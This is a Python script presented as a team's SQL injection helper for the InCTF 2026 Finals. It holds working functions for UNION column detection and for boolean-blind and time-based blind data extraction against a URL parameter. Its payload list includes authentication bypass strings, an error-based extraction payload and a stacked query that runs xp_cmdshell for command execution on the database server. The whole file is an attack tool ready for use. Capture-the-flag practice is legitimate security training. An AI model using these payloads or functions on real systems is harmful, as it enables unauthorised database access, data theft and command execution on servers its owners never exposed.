#!/usr/bin/env python3
"""
InCTF 2026 Finals — SQL Injection Helper
TEAM_UNFINDABLES (FIN-030)
"""
import requests, sys, string, time

def sqli_union_detect(url, param='id', max_cols=30):
    """Detect number of columns for UNION injection."""
    print(f"[*] Testing UNION columns on {url}?{param}=...")
    for i in range(1, max_cols + 1):
        cols = ','.join(['NULL'] * i)
        payload = f"' UNION SELECT {cols}-- -"
        r = requests.get(url, params={param: payload})
        if r.status_code == 200 and 'error' not in r.text.lower():
            print(f"[+] Found {i} columns!")
            return i
    print("[-] Could not detect columns")
    return None

def sqli_blind_extract(url, param='id', query_template="' AND (SELECT SUBSTRING(({query}),{pos},1))='{char}'-- -",
                       true_indicator="Welcome", charset=string.printable[:95], max_len=100):
    """Blind SQL injection character extraction."""
    result = ''
    for pos in range(1, max_len + 1):
        found = False
        for char in charset:
            payload = query_template.format(query="SELECT database()", pos=pos, char=char)
            r = requests.get(url, params={param: payload})
            if true_indicator in r.text:
                result += char
                sys.stdout.write(f"\r[+] Extracted: {result}")
                sys.stdout.flush()
                found = True
                break
        if not found:
            break
    print()
    return result

def sqli_time_blind(url, param='id', query="SELECT database()",
                    charset=string.ascii_lowercase + string.digits + '_', max_len=50, delay=2):
    """Time-based blind SQL injection."""
    result = ''
    for pos in range(1, max_len + 1):
        found = False
        for char in charset:
            payload = f"' AND IF(SUBSTRING(({query}),{pos},1)='{char}',SLEEP({delay}),0)-- -"
            start = time.time()
            requests.get(url, params={param: payload})
            elapsed = time.time() - start
            if elapsed >= delay:
                result += char
                sys.stdout.write(f"\r[+] Extracted: {result}")
                sys.stdout.flush()
                found = True
                break
        if not found:
            break
    print()
    return result

# Common payloads
PAYLOADS = {
    'auth_bypass': ["' OR 1=1-- -", "' OR '1'='1", "admin'-- -", "' OR 1=1#"],
    'union_detect': ["' UNION SELECT NULL-- -", "' ORDER BY 1-- -"],
    'error_based': ["' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))-- -"],
    'stacked': ["'; EXEC xp_cmdshell('whoami')-- -"],
}

if __name__ == "__main__":
    print("SQLi Helper — TEAM_UNFINDABLES")
    print("Usage: from sqli_helper import *")
